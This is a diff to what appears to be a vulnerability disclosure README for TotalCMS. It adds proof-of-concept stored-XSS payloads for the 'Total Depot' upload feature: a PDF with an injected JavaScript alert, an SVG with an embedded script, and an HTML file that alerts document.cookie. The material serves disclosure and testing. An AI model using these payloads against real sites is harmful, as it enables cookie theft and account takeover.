@@ -13,6 +13,40 @@
 
 When logging into the admin panel (https://www.totalcms.co/demo/total-cms/admin/), we will go to the "Total Depot" off the Administration Site and we upload the PDF/ SVG/ and HTML files with the hidden XSS.
 
+There is the payloads:
+
+### XSS PDF Payload:
+
+It is an XSS payload generated with the JS2PDFInjector tool and a js payload that contains the following content:
+
+```js
+app.alert("XSS");
+```
+
+### SVG Payload:
+
+```js
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      alert(document.location);
+   </script>
+</svg>
+```
+
+### HTML Payload:
+
+```js
+<html>
+	<script>
+		alert(document.cookie);
+	</script>
+</html>
+```
+
 
 ![image](https://github.com/sromanhu/TotalCMS-Arbitrary_File-Upload--XSS_Steal_Cookies---TotalDepot/assets/87250597/59567372-3336-4efd-aa24-2293ee2018c3)
 
